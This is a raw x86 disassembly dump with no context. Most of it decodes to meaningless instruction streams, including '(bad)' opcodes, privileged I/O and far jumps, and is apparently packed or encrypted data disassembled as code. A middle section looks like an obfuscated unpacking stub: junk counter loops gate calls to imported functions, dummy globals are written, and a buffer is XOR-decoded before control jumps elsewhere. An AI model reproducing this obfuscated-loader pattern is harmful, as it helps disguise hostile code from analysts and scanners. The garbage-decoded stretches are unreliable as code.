  410cc9:	mov    BYTE PTR [esi],bl
  410ccb:	or     bl,bl
  410ccd:	loop   0x410c52
  410ccf:	pushf  
  410cd0:	fcomp  DWORD PTR [esi-0x4c]
  410cd3:	test   DWORD PTR [esp+eiz*2-0x5711826d],0x2ad1c9ed
  410cde:	idiv   BYTE PTR [edx-0x62fd11eb]
  410ce4:	xchg   edx,eax
  410ce5:	arpl   WORD PTR [edi+0x531c164c],dx
  410ceb:	xor    DWORD PTR [ecx+0x5844b073],0xe0ff02fc
  410cf5:	aaa    
  410cf6:	popa   
  410cf7:	ins    DWORD PTR es:[edi],dx
  410cf8:	fisub  DWORD PTR [edi+0x72]
  410cfb:	pop    edx
  410cfc:	cld    
  410cfd:	sahf   
  410cfe:	inc    ecx
  410cff:	je     0x410c9e
  410d01:	in     al,dx
  410d02:	ret    
  410d03:	mov    bh,0xc
  410d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d06:	add    esp,DWORD PTR [ebx+ebp*1]
  410d09:	dec    ebx
  410d0a:	out    0x89,al
  410d0c:	outs   dx,BYTE PTR ds:[esi]
  410d0d:	dec    edi
  410d0e:	mov    al,ds:0x98519ade
  410d13:	out    0xe,al
  410d15:	pop    ss
  410d16:	mov    dl,0x11
  410d18:	ficomp DWORD PTR [esi+0x7a1c5f40]
  410d1e:	mov    WORD PTR [eax+ebp*2],?
  410d21:	push   ds
  410d22:	aas    
  410d23:	jbe    0x410d9b
  410d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d26:	outs   dx,BYTE PTR ds:[esi]
  410d27:	shl    BYTE PTR [esi],cl
  410d29:	sub    ah,BYTE PTR [esi+0x4f27ac56]
  410d2f:	or     al,0xe2
  410d31:	fcom   DWORD PTR [eax+eiz*8-0x1f0fe35c]
  410d38:	in     al,0x2a
  410d3a:	cmp    eax,0x3b101a26
  410d3f:	or     al,bh
  410d41:	mov    esi,0xeccab2f8
  410d46:	out    0x18,eax
  410d48:	loope  0x410cde
  410d4a:	sub    eax,0x76cc771b
  410d4f:	leave  
  410d50:	cs inc ebx
  410d52:	cli    
  410d53:	mov    eax,ds:0x16707bc4
  410d58:	or     BYTE PTR [eax],dl
  410d5a:	xchg   BYTE PTR [ecx-0x5295a8f5],al
  410d60:	xchg   DWORD PTR ds:0x1c7a9dbb,ebx
  410d66:	aam    0xd7
  410d68:	pop    esp
  410d69:	push   ds
  410d6a:	jmp    0x410cff
  410d6c:	sbb    bl,BYTE PTR [edi]
  410d6e:	cmp    al,0x95
  410d70:	mov    cl,al
  410d72:	sbb    BYTE PTR [ebx-0xf],bh
  410d75:	jno    0x410d24
  410d77:	cvtps2pd xmm7,QWORD PTR [ecx+edx*4+0x7c42a3f2]
  410d7f:	aam    0x12
  410d81:	bound  edi,QWORD PTR [ebp+0x35]
  410d84:	hlt    
  410d85:	mov    dh,0xef
  410d87:	jmp    0x410dde
  410d89:	ss pop edi
  410d8b:	out    0xef,eax
  410d8d:	pop    esi
  410d8e:	cld    
  410d8f:	mov    ebx,0xcf3997a0
  410d94:	inc    eax
  410d95:	(bad)  
  410d98:	inc    ebp
  410d99:	fisttp QWORD PTR [edi-0x25]
  410d9c:	add    al,0xc1
  410d9e:	cmc    
  410d9f:	dec    eax
  410da0:	repz dec esi
  410da2:	pushf  
  410da3:	mov    DWORD PTR [eax+edx*8],esi
  410da6:	or     esi,0xffffff97
  410da9:	sub    DWORD PTR [edx-0x63af7041],edi
  410daf:	ret    
  410db0:	push   ss
  410db1:	pop    ecx
  410db2:	inc    esp
  410db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410db4:	push   ebx
  410db5:	outs   dx,DWORD PTR ds:[esi]
  410db6:	jle    0x410e0a
  410db8:	bound  edx,QWORD PTR [edx-0x1c]
  410dbb:	and    eax,0xd44ddabb
  410dc0:	imul   eax,DWORD PTR [esi],0x351dfadb
  410dc6:	fidiv  WORD PTR [esi-0x45]
  410dc9:	in     eax,0x4c
  410dcb:	or     BYTE PTR [edx+ecx*2-0x6b],dh
  410dcf:	add    al,0xcf
  410dd1:	dec    eax
  410dd2:	and    BYTE PTR [esi+0x60],cl
  410dd5:	aad    0x62
  410dd7:	add    eax,0x7ec730ce
  410ddc:	aas    
  410ddd:	call   0xd02175f1
  410de2:	lods   al,BYTE PTR ds:[esi]
  410de3:	cmp    ebx,DWORD PTR [esp+edi*1-0x5d3858c9]
  410dea:	sub    DWORD PTR [ebp+esi*4-0x72],esi
  410dee:	jmp    0x414b3bb2
  410df3:	push   edx
  410df4:	xor    al,0x87
  410df6:	clc    
  410df7:	xchg   ebp,eax
  410df8:	icebp  
  410df9:	mov    WORD PTR [edx-0x823cd34],fs
  410dff:	mov    ebx,0x4574a63c
  410e04:	jmp    0xa238:0xebb77249
  410e0b:	or     DWORD PTR [ecx-0x71],0xd788ccf1
  410e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e13:	into   
  410e14:	neg    DWORD PTR [edi]
  410e16:	lds    esi,FWORD PTR [ebp+0x43585f05]
  410e1c:	and    eax,0x4fcafd60
  410e21:	rcr    DWORD PTR [ebx+ecx*4],1
  410e24:	jge    0x410e85
  410e26:	mov    DWORD PTR [ebp-0x1d],esp
  410e29:	hlt    
  410e2a:	gs xor al,0xcc
  410e2d:	mov    bl,0x9d
  410e2f:	iret   
  410e30:	data16 or bl,dl
  410e33:	pop    eax
  410e34:	cli    
  410e35:	add    BYTE PTR [esi+0x405078c5],bh
  410e3b:	pop    esp
  410e3c:	test   BYTE PTR [edx-0x28],bl
  410e3f:	sub    al,0xdb
  410e41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e42:	and    edx,DWORD PTR [ecx]
  410e44:	add    ebx,esp
  410e46:	push   ss
  410e47:	addr16 push cs
  410e49:	in     al,dx
  410e4a:	jl     0x410e93
  410e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e4d:	and    eax,0xc3258288
  410e52:	mov    bh,0x18
  410e54:	neg    DWORD PTR [edi]
  410e56:	xlat   BYTE PTR ds:[ebx]
  410e57:	cmc    
  410e58:	mov    esi,0x56683c59
  410e5d:	das    
  410e5e:	mov    ecx,0xbdb28bd
  410e63:	js     0x410e3e
  410e65:	xlat   BYTE PTR ds:[ebx]
  410e66:	xor    ch,BYTE PTR [esi]
  410e68:	mov    DWORD PTR [esp+ebx*8+0x7d74ebc3],edi
  410e6f:	add    al,0xb5
  410e71:	mov    eax,0x7134a7f3
  410e76:	scas   eax,DWORD PTR es:[edi]
  410e77:	pop    esi
  410e78:	ins    BYTE PTR es:[edi],dx
  410e79:	in     eax,0xa6
  410e7b:	and    ebp,DWORD PTR [edi+eiz*1-0x3e]
  410e7f:	outs   dx,DWORD PTR ds:[esi]
  410e80:	loope  0x410e82
  410e82:	ins    DWORD PTR es:[edi],dx
  410e83:	outs   dx,BYTE PTR ds:[esi]
  410e84:	call   FWORD PTR [eax+0x1b]
  410e87:	xor    BYTE PTR [ecx+0x1f],bl
  410e8a:	fimul  WORD PTR [ecx-0x51a4fd62]
  410e90:	or     al,0x7e
  410e92:	xchg   edi,eax
  410e93:	icebp  
  410e94:	xchg   ecx,eax
  410e95:	fst    QWORD PTR [edi+0x69]
  410e98:	mov    ch,0xe1
  410e9a:	retf   
  410e9b:	push   ebx
  410e9c:	jg     0x410e87
  410e9e:	arpl   WORD PTR [ebx-0x4398a90b],ax
  410ea4:	inc    edx
  410ea5:	mov    al,0x5c
  410ea7:	push   0xffffff9e
  410ea9:	mov    DWORD PTR [edx+0x5a],eax
  410eac:	mov    ds:0xaffe31c6,al
  410eb1:	push   edx
  410eb2:	dec    edx
  410eb3:	xchg   ebp,eax
  410eb4:	das    
  410eb5:	adc    DWORD PTR [edx-0x41],edi
  410eb8:	gs (bad) 
  410eba:	pop    ecx
  410ebb:	pop    edx
  410ebc:	xchg   ebp,eax
  410ebd:	push   0x5b106433
  410ec2:	lods   al,BYTE PTR ds:[esi]
  410ec3:	popf   
  410ec4:	mov    ch,0xeb
  410ec6:	outs   dx,DWORD PTR ds:[esi]
  410ec7:	sbb    eax,0x88e7b355
  410ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ecd:	(bad)  
  410ecf:	and    DWORD PTR [ecx-0x5a8c1022],ecx
  410ed5:	mov    edi,0x4cf3d513
  410edb:	mov    ds:0x2b962582,eax
  410ee0:	cmp    BYTE PTR [edx+0x33],0xa
  410ee4:	test   al,0x4d
  410ee6:	push   ecx
  410ee7:	outs   dx,BYTE PTR ds:[esi]
  410ee8:	dec    ebx
  410ee9:	xchg   ebx,eax
  410eea:	add    al,0xfa
  410eec:	mov    ds:0x8334fc11,eax
  410ef1:	sub    edx,DWORD PTR [eax-0x2e62a2b0]
  410ef7:	ss and al,0x5
  410efa:	mov    edx,0x70504f17
  410eff:	outs   dx,DWORD PTR ds:[esi]
  410f00:	imul   ebp,DWORD PTR [ebp-0x2e1f0103],0x1946857c
  410f0a:	sbb    DWORD PTR [ebx+0x30],edx
  410f0d:	inc    esi
  410f0e:	xchg   esi,eax
  410f0f:	sbb    al,0xf1
  410f11:	imul   BYTE PTR [edi-0x26]
  410f14:	dec    esi
  410f15:	push   ss
  410f16:	sbb    bl,BYTE PTR [ecx-0x6b]
  410f19:	cmp    bl,BYTE PTR [eax+0x7e411659]
  410f1f:	and    eax,0xbd098853
  410f24:	jmp    0x410ed2
  410f26:	out    dx,al
  410f27:	fnstcw WORD PTR [eax+0x7b]
  410f2a:	mov    dl,0x32
  410f2c:	mov    edx,0x51208211
  410f31:	dec    ecx
  410f32:	(bad)  
  410f33:	xor    esi,DWORD PTR [edx-0x11]
  410f36:	mov    ebx,0xf4168f11
  410f3b:	sbb    dl,ch
  410f3d:	and    eax,0x5e05c434
  410f42:	push   esi
  410f43:	shr    bl,1
  410f45:	jecxz  0x410f8f
  410f47:	sahf   
  410f48:	sub    ebp,DWORD PTR [edi]
  410f4a:	add    ebx,DWORD PTR [ebp-0x480fafb3]
  410f50:	in     al,0x84
  410f52:	adc    cl,BYTE PTR [ebx]
  410f54:	dec    esp
  410f55:	pop    ss
  410f56:	popf   
  410f57:	movups XMMWORD PTR ss:[ecx],xmm2
  410f5b:	or     ecx,edi
  410f5d:	loopne 0x410fde
  410f5f:	jg     0x410f74
  410f61:	fs ret 
  410f63:	dec    ebx
  410f64:	xchg   DWORD PTR [edi],eax
  410f66:	xchg   edi,eax
  410f67:	sbb    edi,DWORD PTR [edi+0x5e343176]
  410f6d:	mov    al,ds:0xbbafd88e
  410f72:	bound  esp,QWORD PTR [ebx-0x62]
  410f75:	mov    al,ds:0x80163dec
  410f7a:	ins    BYTE PTR es:[edi],dx
  410f7b:	push   ecx
  410f7c:	(bad)
  410f80:	jmp    0xeab0:0x486966b0
  410f87:	fcom   st(2)
  410f89:	and    eax,0x606c60ce
  410f8e:	xor    al,0xb6
  410f90:	daa    
  410f91:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  410f93:	and    esi,DWORD PTR ds:0x9fe865fa
  410f99:	dec    ebp
  410f9a:	and    eax,0x1ced07ba
  410f9f:	aad    0xfe
  410fa1:	sbb    ebp,DWORD PTR [edi+0x4d]
  410fa4:	xor    bh,bh
  410fa6:	loopne 0x410fc6
  410fa8:	push   ecx
  410fa9:	push   0xfffffffe
  410fab:	maxps  xmm7,XMMWORD PTR [edi]
  410fae:	pusha  
  410faf:	xchg   edi,eax
  410fb0:	(bad)  
  410fb1:	dec    ebp
  410fb2:	jg     0x410fec
  410fb4:	or     esp,ecx
  410fb6:	dec    edx
  410fb7:	ret    0x98bc
  410fba:	jmp    edx
  410fbc:	scas   al,BYTE PTR es:[edi]
  410fbd:	daa    
  410fbe:	retf   0xf356
  410fc1:	pop    esi
  410fc2:	adc    eax,edx
  410fc4:	mov    ah,0xef
  410fc6:	and    eax,0xa3634890
  410fcb:	cmc    
  410fcc:	addr16 or al,bl
  410fcf:	bound  ecx,QWORD PTR [eax]
  410fd1:	push   edi
  410fd2:	aad    0xcf
  410fd4:	sbb    al,0xaf
  410fd6:	mov    ebp,0x86731585
  410fdb:	fcomp  DWORD PTR [ecx]
  410fdd:	mov    bl,0x40
  410fdf:	retf   
  410fe0:	sbb    DWORD PTR [esi],0xffffff8f
  410fe3:	mov    al,0x7c
  410fe5:	imul   esp,DWORD PTR [esi],0x44
  410fe8:	and    DWORD PTR [ebp+0x24],0x2246fde9
  410fef:	pop    es
  410ff0:	xor    DWORD PTR [eax],edi
  410ff2:	dec    ebp
  410ff3:	mov    ebp,0xb0fd4a02
  410ff8:	adc    BYTE PTR [eax],dh
  410ffa:	dec    esi
  410ffb:	loope  0x410fec
  410ffd:	cwde   
  410ffe:	leave  
  410fff:	push   edx
  411000:	inc    esp
  411002:	cmp    bh,bh
  411004:	aaa    
  411005:	cli    
  411006:	aam    0xee
  411008:	out    dx,eax
  411009:	es (bad) 
  41100b:	cmp    eax,0x428d1df3
  411010:	jae    0x410fed
  411012:	ret    0x6c9a
  411015:	or     BYTE PTR [ecx+0x74c3f25a],dh
  41101b:	adc    eax,0xdca48bc6
  411020:	mov    ch,0xdc
  411022:	jb     0x411099
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	xchg   ebx,eax
  4115ac:	mov    DWORD PTR [ebp+0x7caf407f],eax
  4115b2:	jl     0x4115f4
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	dec    eax
  4115b8:	cli    
  4115b9:	or     DWORD PTR [edi+0x71fa3011],esi
  4115bf:	ss push ds
  4115c1:	sbb    ch,BYTE PTR [ecx-0x10814f07]
  4115c7:	(bad)  
  4115c8:	jmp    FWORD PTR [ecx+0x24]
  4115cb:	imul   esp,DWORD PTR [eax-0x3d6105ad],0xfffffff9
  4115d2:	les    di,DWORD PTR [edi-0x7e]
  4115d6:	adc    eax,0x9938e9a7
  4115db:	mov    ebx,0xf2c86e
  4115e0:	aaa    
  4115e1:	pop    esi
  4115e2:	shl    al,1
  4115e4:	cmc    
  4115e5:	and    esp,esi
  4115e7:	icebp  
  4115e8:	pushf  
  4115e9:	xor    dh,BYTE PTR [ecx-0x4c9a8ae]
  4115ef:	mov    eax,ds:0x1b84d784
  4115f4:	mov    ch,0x83
  4115f6:	mov    ebp,0x3aa4f41c
  4115fb:	neg    al
  4115fd:	cmp    dh,al
  4115ff:	push   es
  411600:	push   ebx
  411601:	fadd   QWORD PTR [ebx+0x32]
  411604:	outs   dx,BYTE PTR ds:[esi]
  411605:	xchg   ecx,eax
  411606:	fcom   QWORD PTR [ebp+0x38]
  411609:	pop    DWORD PTR ss:[eax-0x1]
  41160d:	test   ebx,edi
  41160f:	mov    ebx,0xd835aa13
  411614:	and    dh,cl
  411616:	aaa    
  411617:	jno    0x4115e9
  411619:	shl    BYTE PTR [ebp-0xb266a8f],0x8e
  411620:	mov    ds:0xda9e6ba3,eax
  411625:	mov    ecx,DWORD PTR [eax+esi*1]
  411628:	nop
  411629:	inc    esi
  41162a:	mov    BYTE PTR [edx+0x36ef75cf],cl
  411630:	cs (bad) 
  411632:	push   cs
  411633:	sbb    DWORD PTR [edx-0x4806765c],ebx
  411639:	push   ebp
  41163a:	cmp    BYTE PTR [edi+0x55],ch
  41163d:	ficomp DWORD PTR [edi]
  41163f:	dec    ecx
  411640:	dec    esi
  411641:	add    al,0x93
  411643:	rol    DWORD PTR [esi],1
  411645:	jmp    0x411684
  411647:	cmp    BYTE PTR ds:0x61c9e388,bh
  41164d:	or     al,0xe6
  41164f:	pop    es
  411650:	jmp    0x41166c
  411652:	xchg   esi,eax
  411653:	retf   0x6291
  411656:	aam    0x11
  411658:	sub    dh,BYTE PTR fs:[ebp-0x628b00ee]
  41165f:	out    0x58,al
  411661:	out    0x62,eax
  411663:	ror    DWORD PTR [edi],cl
  411665:	and    al,BYTE PTR [esi]
  411667:	data16 and bh,ah
  41166a:	dec    edi
  41166b:	xor    al,0x31
  41166d:	push   edi
  41166e:	ds xchg esp,eax
  411670:	mov    bl,0x59
  411672:	mov    ebp,0xaaa03d86
  411677:	and    ebx,eax
  411679:	adc    eax,0xf82d435b
  41167e:	xchg   esi,eax
  41167f:	xchg   edi,eax
  411680:	sahf   
  411681:	rcr    DWORD PTR [ebp+0x4f],cl
  411684:	(bad)  
  411685:	call   0xaa4d2384
  41168a:	pusha  
  41168b:	sbb    ecx,ebx
  41168d:	and    ch,bh
  41168f:	inc    eax
  411690:	add    DWORD PTR fs:[ecx+0x7a],esi
  411694:	ss cmp eax,0xe5f8e7c4
  41169a:	pop    DWORD PTR [ebx+0x3e]
  41169d:	sub    ebx,DWORD PTR [eax-0x52]
  4116a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a1:	or     eax,0x8648c493
  4116a6:	or     bl,dl
  4116a8:	jmp    0x19dc:0x97aa4303
  4116af:	retf   0xbe99
  4116b2:	bound  esp,QWORD PTR [eax-0x3f29a446]
  4116b8:	fimul  DWORD PTR [eax+esi*4]
  4116bb:	outs   dx,BYTE PTR ds:[esi]
  4116bc:	lea    ebx,[edi+ebx*1]
  4116bf:	adc    esp,DWORD PTR [esi+0x7277f1bd]
  4116c5:	and    DWORD PTR [edx+0x7ad2365d],eax
  4116cb:	leave  
